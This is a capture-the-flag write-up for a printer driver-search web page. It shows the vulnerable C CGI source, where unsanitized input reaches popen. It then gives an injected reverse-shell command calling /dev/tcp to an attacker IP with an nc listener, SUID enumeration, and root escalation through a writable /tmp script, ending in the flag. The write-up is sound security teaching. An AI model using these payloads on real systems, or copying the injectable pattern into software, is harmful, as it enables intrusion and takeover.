> [!example] Challenge Prompt
>
> I found this printer on the network, and it seems to be running... a weird web page... to search for drivers?
>
> Escalate your privileges and uncover the flag in the **`root`** user's home directory.

- From the source we identify a command injection vulnerability

```c
#include <stdio.h>
#include <stdlib.h>
#include <errno.h>
#include <time.h>
#include <ctype.h>
#include <string.h>

void urldecode2(char *dst, char *src)
{
        char a, b;
        while (*src) {
                if ((*src == '%') &&
                    ((a = src[1]) && (b = src[2])) &&
                    (isxdigit(a) && isxdigit(b))) {
                        if (a >= 'a')
                                a -= 'a'-'A';
                        if (a >= 'A')
                                a -= ('A' - 10);
                        else
                                a -= '0';
                        if (b >= 'a')
                                b -= 'a'-'A';
                        if (b >= 'A')
                                b -= ('A' - 10);
                        else
                                b -= '0';
                        *dst++ = 16*a+b;
                        src+=3;
                } else if (*src == '+') {
                        *dst++ = ' ';
                        src++;
                } else {
                        *dst++ = *src++;
                }
        }
        *dst++ = '\0';
}
int main ()
{
   char *env_value;
   char *save_env;

   printf("Content-type: text/html\n\n");
   save_env = getenv("QUERY_STRING");
   if (strncmp(save_env, "q=", 2) == 0) {
        memmove(save_env, save_env + 2, strlen(save_env + 2) + 1);

    }

   char *decoded = (char *)malloc(strlen(save_env) + 1);

   urldecode2(decoded, save_env);


   char first_part[] = "grep -R -i ";
   char last_part[] = " /var/www/html/data/printer_drivers.txt" ;
   size_t totalLength = strlen(first_part) + strlen(last_part) + strlen(decoded) + 1;
   char *combinedString = (char *)malloc(totalLength);
   if (combinedString == NULL) {
        printf("Failed to allocate memory");
        return 1;
   }
   strcpy(combinedString, first_part);
   strcat(combinedString, decoded); <-- User input is unsanitized
   strcat(combinedString, last_part);
   FILE *fp;
   char buffer[1024];

   fp = popen(combinedString, "r");
   if (fp == NULL) {
      printf("Error running command\n");
      return 1;
   }
   while (fgets(buffer, sizeof(buffer), fp) != NULL) {
      printf("%s<br>", buffer);
   }

   pclose(fp);

   fflush(stdout);
   free(combinedString);
   free(decoded);
   exit (0);
}
```

```c
strcpy(combinedString, first_part);
strcat(combinedString, decoded); <-- User input is unsanitized
strcat(combinedString, last_part);
```

- Builds a string like this:

```sh
grep -R -i [USER_INPUT] /var/www/html/data/printer_drivers.txt
```

- Which gives us the opportunity to put a semicolon and terminate the command early, then running our own!
- So by running a test cmd we can confirm RCE

![[Pasted image 20251102112110.png]]

![[Pasted image 20251102112119.png]]

- We can gain access to the machine via revshell command
- `;bash -c "sh -i >& /dev/tcp/10.200.11.67/6969 0>&1";`
- Have your listener ready:

```sh
$ nc -lvnp 6969
listening on [any] 6969 ...
connect to [10.200.11.67] from (UNKNOWN) [10.1.43.71] 51196
sh: 0: can`t access tty; job control turned off

$ whoami
www-data
```

- We are told the flag is in root directory so we must first escalate our privileges
- We can search potential binaries to abuse with common enumeration commands

```sh
$ find / -perm -4000 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help

$ find / -perm -u=s -type f 2>/dev/null
/usr/bin/mount
/usr/bin/chfn
/usr/bin/passwd
/usr/bin/umount
/usr/bin/gpasswd
/usr/bin/su
/usr/bin/newgrp
/usr/bin/chsh
/usr/local/bin/admin_help
```

- `/usr/local/bin/admin_help` seems unusual so we investigate and find it runs as root

```sh
$ $ ls -la /usr/local/bin/admin_help
-rwsr-xr-x 1 root root 16416 Oct 69  03:06 /usr/local/bin/admin_help

$ /usr/local/bin/admin_help

Error opening original file: No such file or directory
Your wish is my command... maybe :)
Bad String in File.
```

- It is looking for something, we use `strings` to try and see anything in the binary itself

```sh
$ strings /usr/local/bin/admin_help

*snip*
wish.sh
[]A\
[]A\
Error opening original file
Bad String in File.
Your wish is my command... maybe :)
chmod +x /tmp/wish.sh && /tmp/wish.sh
*snip*
```

- AHA! `chmod +x /tmp/wish.sh && /tmp/wish.sh` we can likely put our wish into this file and execute it as root!
- So let us print the flag by creating `wish.sh`

```sh
$ printf 'cat flag.txt\n' > /tmp/wish.sh

$ /usr/local/bin/admin_help

flag{93541544b91b7d2b9d61e90becbca309}
Your wish is my command... maybe :)
```
